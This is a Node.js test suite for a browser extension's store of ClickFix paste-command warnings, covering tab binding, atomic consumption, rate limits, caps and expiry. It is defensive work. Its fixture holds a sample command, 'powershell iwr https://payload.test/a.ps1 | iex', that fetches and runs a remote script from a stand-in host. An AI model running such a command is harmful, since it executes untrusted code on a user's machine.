import test from "node:test";
import assert from "node:assert/strict";

import {
  CLICKFIX_WARNING_MAX_ACTIVE,
  CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB,
  CLICKFIX_WARNING_OPEN_RATE_LIMIT,
  CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS,
  CLICKFIX_WARNING_STATE_KEY,
  CLICKFIX_WARNING_TTL_MS,
  createClickfixWarningStore,
} from "./clickfixWarnings.mjs";

function memoryStorage(initial = {}) {
  let data = structuredClone(initial);
  return {
    async get(keys) {
      // Yield once so concurrent unqueued read-modify-write operations would
      // both be able to observe the same stale snapshot.
      await Promise.resolve();
      const requested = Array.isArray(keys) ? keys : [keys];
      const result = {};
      for (const key of requested) {
        if (Object.hasOwn(data, key)) result[key] = structuredClone(data[key]);
      }
      return result;
    },
    async set(values) {
      await Promise.resolve();
      data = { ...data, ...structuredClone(values) };
    },
    dump() {
      return structuredClone(data);
    },
  };
}

function idSource(...ids) {
  let index = 0;
  return {
    randomUUID() {
      const id = ids[index];
      index += 1;
      if (id === undefined) throw new Error("test id source exhausted");
      return id;
    },
  };
}

function warning(overrides = {}) {
  return {
    sourceTabId: 10,
    sourceFrameId: 0,
    sourceDocumentId: "document-a",
    sourceUrl: "https://source.test/instructions",
    mode: "warn",
    decision: {
      action: "warn",
      reasons: ["system tool", "download behavior"],
    },
    text: "powershell iwr https://payload.test/a.ps1 | iex",
    ...overrides,
  };
}

function storedWarning(requestId, overrides = {}) {
  return {
    requestId,
    ...warning(overrides),
    warningTabId: null,
    createdAt: 1,
    expiresAt: 1_000,
  };
}

test("createWarning stores a short-lived, unbound, immutable record", async () => {
  const storageArea = memoryStorage();
  const input = warning();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 1_000,
    ttlMs: 500,
    cryptoApi: idSource("request-a"),
  });

  const created = await store.createWarning(input);

  assert.deepEqual(created, {
    requestId: "request-a",
    ...input,
    warningTabId: null,
    createdAt: 1_000,
    expiresAt: 1_500,
  });
  assert.equal(Object.isFrozen(created), true);
  assert.equal(Object.isFrozen(created.decision), true);
  assert.equal(Object.isFrozen(created.decision.reasons), true);

  // Neither the caller's input nor the returned snapshot can mutate storage.
  input.decision.reasons.push("changed after create");
  assert.throws(() => created.decision.reasons.push("changed after return"), TypeError);

  await store.bindWarningTab("request-a", 20);
  const reread = await store.getWarning("request-a", 20);
  assert.deepEqual(reread.decision.reasons, ["system tool", "download behavior"]);
  assert.notStrictEqual(reread, created);
  assert.notStrictEqual(reread.decision, created.decision);

  const persisted = storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id["request-a"];
  assert.equal(persisted.warningTabId, 20);
  assert.deepEqual(persisted.decision.reasons, ["system tool", "download behavior"]);
});

test("warning-tab binding is one-time and retrieval is bound to the exact tab", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createWarning(warning());

  assert.equal(await store.getWarning("request-a", 40), null, "an unbound record is not readable");
  const bound = await store.bindWarningTab("request-a", 40);
  assert.equal(bound.warningTabId, 40);
  assert.equal((await store.bindWarningTab("request-a", 40)).warningTabId, 40, "same-tab bind is idempotent");
  assert.equal(await store.bindWarningTab("request-a", 41), null, "a warning cannot move to another tab");
  assert.equal(await store.getWarning("request-a", 41), null);
  assert.equal((await store.getWarning("request-a", 40)).requestId, "request-a");
});

test("consumeWarning is atomic and a wrong tab cannot consume another tab's warning", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createWarning(warning());
  await store.bindWarningTab("request-a", 40);

  assert.equal(await store.consumeWarning("request-a", 41), null);
  const [first, second] = await Promise.all([
    store.consumeWarning("request-a", 40),
    store.consumeWarning("request-a", 40),
  ]);

  assert.equal(first?.requestId, "request-a");
  assert.equal(second, null);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
});

test("FIFO serialization prevents concurrent creates from losing an entry", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a", "request-b"),
  });

  const [first, second] = await Promise.all([
    store.createWarning(warning({ sourceTabId: 1 })),
    store.createWarning(warning({ sourceTabId: 2 })),
  ]);

  assert.deepEqual([first.requestId, second.requestId], ["request-a", "request-b"]);
  assert.deepEqual(
    Object.keys(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id),
    ["request-a", "request-b"]
  );
});

test("createWarning atomically enforces the global active-warning cap", async () => {
  const ids = Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE }, (_, index) => `request-${index}`);
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource(...ids),
  });

  const results = await Promise.all(
    Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE + 1 }, (_, index) =>
      store.createWarning(warning({ sourceTabId: index + 1 })))
  );

  assert.equal(results.filter((result) => result !== null).length, CLICKFIX_WARNING_MAX_ACTIVE);
  assert.equal(results.at(-1), null);
  assert.equal(
    Object.keys(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id).length,
    CLICKFIX_WARNING_MAX_ACTIVE
  );
});

test("createWarning enforces the per-source active cap independently of the rate window", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    cryptoApi: idSource("request-a", "request-b", "request-c"),
  });

  for (let index = 0; index < CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB; index += 1) {
    assert.notEqual(await store.createWarning(warning()), null);
    clock += CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS + 1;
  }
  assert.equal(await store.createWarning(warning()), null);
});

test("warning-open rate limit survives service-worker store reconstruction", async () => {
  let clock = 1_000;
  const storageArea = memoryStorage();
  const firstWorkerStore = createClickfixWarningStore(storageArea, {
    now: () => clock,
    cryptoApi: idSource("request-a", "request-b", "request-c"),
  });

  for (let index = 0; index < CLICKFIX_WARNING_OPEN_RATE_LIMIT; index += 1) {
    const created = await firstWorkerStore.createWarning(warning());
    assert.notEqual(created, null);
    assert.equal(await firstWorkerStore.discardWarning(created.requestId), true);
  }

  const restartedWorkerStore = createClickfixWarningStore(storageArea, {
    now: () => clock,
    cryptoApi: idSource("request-d"),
  });
  assert.equal(await restartedWorkerStore.createWarning(warning()), null);

  clock += CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS;
  assert.equal((await restartedWorkerStore.createWarning(warning())).requestId, "request-d");
});

test("persisted warning-open timestamps are pruned, ordered, and bounded on every operation", async () => {
  const storageArea = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: {},
      warning_open_timestamps_by_source_tab: {
        "01": [19_999],
        "10": [0, 15_003, 15_001, 15_002, 15_000, 25_000, "invalid"],
        "11": [],
      },
    },
  });
  const store = createClickfixWarningStore(storageArea, {
    now: () => 20_000,
    cryptoApi: idSource("unused"),
  });

  assert.equal(await store.nextExpiry(), null);
  assert.deepEqual(
    storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warning_open_timestamps_by_source_tab,
    { "10": [15_001, 15_002, 15_003] }
  );
});

test("persisted active warnings are normalized back to global and per-source caps", async () => {
  const globallyOverCap = Object.fromEntries(
    Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE + 1 }, (_, index) => {
      const requestId = `global-${index}`;
      return [requestId, storedWarning(requestId, { sourceTabId: index + 1 })];
    })
  );
  const globalStorage = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: globallyOverCap,
      warning_open_timestamps_by_source_tab: {},
    },
  });
  const globalStore = createClickfixWarningStore(globalStorage, {
    now: () => 10,
    cryptoApi: idSource("unused-global"),
  });

  assert.equal(await globalStore.pruneExpired(), 1);
  assert.equal(
    Object.keys(globalStorage.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id).length,
    CLICKFIX_WARNING_MAX_ACTIVE
  );

  const perSourceWarnings = Object.fromEntries(
    Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB + 1 }, (_, index) => {
      const requestId = `source-${index}`;
      return [requestId, storedWarning(requestId)];
    })
  );
  const sourceStorage = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: perSourceWarnings,
      warning_open_timestamps_by_source_tab: {},
    },
  });
  const sourceStore = createClickfixWarningStore(sourceStorage, {
    now: () => 10,
    cryptoApi: idSource("unused-source"),
  });

  assert.equal(await sourceStore.pruneExpired(), 1);
  assert.equal(
    Object.keys(sourceStorage.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id).length,
    CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB
  );
});

test("expired and malformed records are pruned on every operation", async () => {
  let clock = 100;
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => clock,
    ttlMs: 50,
    cryptoApi: idSource("request-a"),
  });
  await store.createWarning(warning());
  await store.bindWarningTab("request-a", 20);

  clock = 150;
  assert.equal(await store.getWarning("request-a", 20), null);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});

  const malformedStorage = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: {
        malformed: { requestId: "malformed", expiresAt: 999_999 },
      },
    },
  });
  const malformedStore = createClickfixWarningStore(malformedStorage, {
    now: () => 1,
    cryptoApi: idSource("request-b"),
  });
  assert.equal(await malformedStore.pruneExpired(), 1);
  assert.deepEqual(malformedStorage.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
});

test("pruneExpired reports and removes all records whose TTL elapsed", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    ttlMs: 100,
    cryptoApi: idSource("request-a", "request-b"),
  });
  await store.createWarning(warning({ sourceTabId: 1 }));
  clock = 50;
  await store.createWarning(warning({ sourceTabId: 2 }));
  clock = 100;

  assert.equal(await store.pruneExpired(), 1);
  await store.bindWarningTab("request-b", 30);
  assert.equal((await store.getWarning("request-b", 30)).sourceTabId, 2);
});

test("discardTab removes warnings involving either the source or warning tab", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("source-match", "warning-match", "unrelated"),
  });

  await store.createWarning(warning({ sourceTabId: 1 }));
  await store.bindWarningTab("source-match", 11);
  await store.createWarning(warning({ sourceTabId: 2 }));
  await store.bindWarningTab("warning-match", 1);
  await store.createWarning(warning({ sourceTabId: 3 }));
  await store.bindWarningTab("unrelated", 13);

  assert.equal(await store.discardTab(1), 2);
  assert.equal(await store.getWarning("source-match", 11), null);
  assert.equal(await store.getWarning("warning-match", 1), null);
  assert.equal((await store.getWarning("unrelated", 13)).sourceTabId, 3);
});

test("discardSourceDocument removes replaced-document warnings for only the matching frame", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("old", "current", "other-frame", "other-tab"),
  });

  await store.createWarning(warning({ sourceDocumentId: "old-document" }));
  await store.bindWarningTab("old", 20);
  await store.createWarning(warning({ sourceDocumentId: "current-document" }));
  await store.bindWarningTab("current", 21);
  await store.createWarning(warning({ sourceFrameId: 1, sourceDocumentId: "frame-document" }));
  await store.bindWarningTab("other-frame", 22);
  await store.createWarning(warning({ sourceTabId: 11, sourceDocumentId: "other-document" }));
  await store.bindWarningTab("other-tab", 23);

  assert.equal(await store.discardSourceDocument(10, 0, "current-document"), 1);
  assert.equal(await store.getWarning("old", 20), null);
  assert.equal((await store.getWarning("current", 21)).sourceDocumentId, "current-document");
  assert.equal((await store.getWarning("other-frame", 22)).sourceFrameId, 1);
  assert.equal((await store.getWarning("other-tab", 23)).sourceTabId, 11);

  assert.equal(await store.discardSourceDocument(10, 0), 1);
  assert.equal(await store.getWarning("current", 21), null);
  assert.equal((await store.getWarning("other-frame", 22)).sourceFrameId, 1);
});

test("discardWarningTab removes only records bound to the closed warning UI tab", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("source-id-match", "warning-id-match"),
  });
  await store.createWarning(warning({ sourceTabId: 50 }));
  await store.bindWarningTab("source-id-match", 51);
  await store.createWarning(warning({ sourceTabId: 2 }));
  await store.bindWarningTab("warning-id-match", 50);

  assert.equal(await store.discardWarningTab(50), 1);
  assert.equal(await store.getWarning("warning-id-match", 50), null);
  assert.equal((await store.getWarning("source-id-match", 51)).sourceTabId, 50);
});

test("nextExpiry returns the earliest unexpired warning and null after pruning", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    ttlMs: 100,
    cryptoApi: idSource("request-a", "request-b"),
  });
  await store.createWarning(warning({ sourceTabId: 1 }));
  clock = 25;
  await store.createWarning(warning({ sourceTabId: 2 }));

  assert.equal(await store.nextExpiry(), 100);
  clock = 100;
  assert.equal(await store.nextExpiry(), 125);
  clock = 125;
  assert.equal(await store.nextExpiry(), null);
});

test("discardWarning removes an unbound warning after UI creation fails", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createWarning(warning());

  assert.equal(await store.discardWarning("request-a"), true);
  assert.equal(await store.discardWarning("request-a"), false);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
});

test("invalid input is rejected and a failed queued task does not poison later tasks", async () => {
  const storageArea = memoryStorage();
  let idAttempt = 0;
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: {
      randomUUID() {
        idAttempt += 1;
        return idAttempt === 1 ? "" : "request-a";
      },
    },
  });

  await assert.rejects(store.createWarning(warning({ sourceFrameId: -1 })), /sourceFrameId/);
  await assert.rejects(store.createWarning(warning()), /invalid id/);
  const created = await store.createWarning(warning());
  assert.equal(created.requestId, "request-a");
  await assert.rejects(store.createWarning(warning({ decision: new Date() })), /plain objects/);
});

test("default TTL is short-lived and exported for service-worker integration", () => {
  assert.equal(CLICKFIX_WARNING_TTL_MS, 300_000);
  assert.equal(CLICKFIX_WARNING_MAX_ACTIVE, 32);
  assert.equal(CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB, 3);
  assert.equal(CLICKFIX_WARNING_OPEN_RATE_LIMIT, 3);
  assert.equal(CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS, 10_000);
});
